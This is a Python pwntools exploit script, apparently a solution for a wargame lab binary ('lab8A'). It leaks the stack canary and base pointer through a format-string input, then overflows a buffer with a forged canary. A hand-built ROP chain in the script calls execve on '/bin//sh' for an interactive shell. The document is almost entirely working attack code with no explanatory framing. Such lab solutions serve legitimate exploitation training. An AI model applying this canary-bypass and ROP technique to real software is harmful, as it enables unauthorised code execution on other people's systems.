from pwn import *
from struct import pack

# For one gadget RCE:
# LIBC_BASE = ""
# OGRCE_OFFSET = 0x42f90
BIN_PATH = "/levels/lab08/lab8A"
DEADBEEF = 0xdeadbeef


def build_rop_chain():

    rop_chain = ""

    rop_chain += pack(0x0806f22a)  # pop edx ; ret
    rop_chain += pack(0x080ec060)  # @ .data
    rop_chain += pack(0x080bc506)  # pop eax ; ret
    rop_chain += '/bin'
    rop_chain += pack(0x080a2cfd)  # mov dword ptr [edx], eax ; ret
    rop_chain += pack(0x0806f22a)  # pop edx ; ret
    rop_chain += pack(0x080ec064)  # @ .data + 4
    rop_chain += pack(0x080bc506)  # pop eax ; ret
    rop_chain += '//sh'
    rop_chain += pack(0x080a2cfd)  # mov dword ptr [edx], eax ; ret
    rop_chain += pack(0x0806f22a)  # pop edx ; ret
    rop_chain += pack(0x080ec068)  # @ .data + 8
    rop_chain += pack(0x08054ab0)  # xor eax, eax ; ret
    rop_chain += pack(0x080a2cfd)  # mov dword ptr [edx], eax ; ret
    rop_chain += pack(0x080481c9)  # pop ebx ; ret
    rop_chain += pack(0x080ec060)  # @ .data
    rop_chain += pack(0x080e71c5)  # pop ecx ; ret
    rop_chain += pack(0x080ec068)  # @ .data + 8
    rop_chain += pack(0x0806f22a)  # pop edx ; ret
    rop_chain += pack(0x080ec068)  # @ .data + 8
    rop_chain += pack(0x08054ab0)  # xor eax, eax ; ret
    rop_chain += pack(0x080980f0)  # add eax, 3; ret
    rop_chain += pack(0x080980f0)  # add eax, 3; ret
    rop_chain += pack(0x080980f0)  # add eax, 3; ret
    rop_chain += pack(0x080980d7)  # add eax, 2; ret
    rop_chain += pack(0x08048ef6)  # int 0x80

    return rop_chain


p = process(BIN_PATH)

log.info("Stage #1 - Leaking canary & EBP")
p.recv()
# %130$08X - Canary & 0x%131$X - EBP
p.sendline("0x%130$08X:0x%131$X")
buf = p.recv(21)
leaked_canary, leaked_ebp = [int(n, 16) for n in buf.split(":")]
log.info("Leaked canary: 0x{:x}".format(leaked_canary))
log.info("Leaked EBP: 0x{:x}".format(leaked_ebp))
p.sendline("A")

val = DEADBEEF ^ leaked_canary

log.info("Stage #2 - Custom canary value: %x", val)
log.info("Stage #3 - Writing payload")

payload = "A" * 16 + pack('<I', DEADBEEF) + "____" + pack('<I', leaked_canary) + pack('<I', leaked_ebp) + build_rop_chain()

p.recvuntil("..I like to read ^_^ <==  ")
p.sendline(payload)
p.interactive()
